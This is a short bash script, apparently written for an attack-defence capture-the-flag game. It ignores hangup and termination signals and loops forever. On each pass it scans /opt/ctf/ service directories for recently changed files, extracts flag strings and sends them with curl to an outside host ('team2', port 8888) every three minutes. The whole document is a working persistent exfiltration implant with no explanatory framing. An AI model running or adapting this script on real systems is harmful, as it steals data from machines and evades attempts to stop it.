#!/bin/bash

HOST="team2"
PORT="8888"

trap : HUP KILL TERM STOP TSTP

while :; do
for SVC in `find /opt/ctf/ -name append -type d`;
do
	FLAGS=`find $SVC -type f -cmin -3 -exec grep -o 'FLG[[:alnum:]]\{13\}' {} \; | paste -sd '/'`
	curl  "$HOST:$PORT/$FLAGS"
	sleep 3m
done
done
